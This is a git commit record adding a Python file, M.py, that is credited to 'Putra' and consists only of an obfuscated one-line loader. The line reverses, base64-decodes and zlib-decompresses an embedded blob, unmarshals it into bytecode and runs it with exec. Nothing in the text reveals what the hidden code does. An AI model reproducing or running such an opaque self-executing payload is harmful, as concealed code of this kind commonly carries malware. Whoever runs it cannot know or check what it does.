d2cdaa47ddce7449a9c76abdaa56bb6c5b959b5c
nhan5311 <ebejuv@gmail.com>
2025-01-25 11:40:59 +0700

    Create M.py
    # Encrypt By Putra
    # yt : PUTRA-XD
    _ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==ASIBL9AkBhRlYkDGZhBOogAx1lIPSHq6UaK5nbNdoFuLspZvY8wAB6NgYoSKbUaJZWQqiezZR+1IStlsocXlJlQpVx+2UKOLmjp4SLNxSLKhi4dLLaUQWFUHoFnaGZnTZFXQMmbk+5kTmlUdAxWSCZHYCl5aupWdZp7r+5nXC6WUmlWemFWd6Zrn+WUQBlUaW2Vle6qf2F7eIhIHeXvkCv5APVNviDKfBIpIF3jO2aDhW62pyvuB5SrbygwMmCIBpVsYsQLrwSBEWl5UZITGYkRmZuFmSlxoYKFGiihcYMFGShiAkWFTMAsDELDAkZLxJe'))

---
+++ M.py
@@ -0,0 +1,3 @@
+# Encrypt By Putra
+# yt : PUTRA-XD
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==ASIBL9AkBhRlYkDGZhBOogAx1lIPSHq6UaK5nbNdoFuLspZvY8wAB6NgYoSKbUaJZWQqiezZR+1IStlsocXlJlQpVx+2UKOLmjp4SLNxSLKhi4dLLaUQWFUHoFnaGZnTZFXQMmbk+5kTmlUdAxWSCZHYCl5aupWdZp7r+5nXC6WUmlWemFWd6Zrn+WUQBlUaW2Vle6qf2F7eIhIHeXvkCv5APVNviDKfBIpIF3jO2aDhW62pyvuB5SrbygwMmCIBpVsYsQLrwSBEWl5UZITGYkRmZuFmSlxoYKFGiihcYMFGShiAkWFTMAsDELDAkZLxJe'))
